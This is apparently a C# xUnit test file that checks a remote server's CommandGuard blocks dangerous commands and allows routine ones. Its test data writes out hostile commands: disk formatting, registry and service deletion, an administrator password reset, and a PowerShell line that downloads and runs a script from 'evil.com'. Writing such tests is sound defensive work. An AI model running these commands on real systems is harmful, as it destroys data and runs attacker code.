using Remot.Server.Security;
using Xunit;

namespace Remot.Server.Tests;

public class CommandGuardTests
{
    [Theory]
    [InlineData("shutdown /r /t 0")]
    [InlineData("format C:")]
    [InlineData("reg delete HKLM\\SOFTWARE\\Test /f")]
    [InlineData("sc delete RemotServer")]
    [InlineData("sc stop RemotServer")]
    [InlineData("net user administrator 123")]
    [InlineData("schtasks /create /tn evil /tr cmd")]
    [InlineData("sc create EvilService binPath= evil.exe")]
    [InlineData("iex (irm http://evil.com/script.ps1)")]
    public void Blocks_dangerous_commands(string cmd)
    {
        var result = CommandGuard.Check(cmd);
        Assert.NotNull(result);
        Assert.Contains("拦截", result);
    }

    [Theory]
    [InlineData("nssm stop Service29298")]
    [InlineData("nssm start Service29298")]
    [InlineData("echo hello")]
    [InlineData("dir C:\\Users")]
    [InlineData("xcopy src dst /Y")]
    [InlineData("Copy-Item .\\bin\\* C:\\deploy\\")]
    [InlineData("Get-Service Service29298")]
    [InlineData("type C:\\ProgramData\\Remot\\audit.log")]
    public void Allows_normal_commands(string cmd)
    {
        var result = CommandGuard.Check(cmd);
        Assert.Null(result);
    }
}
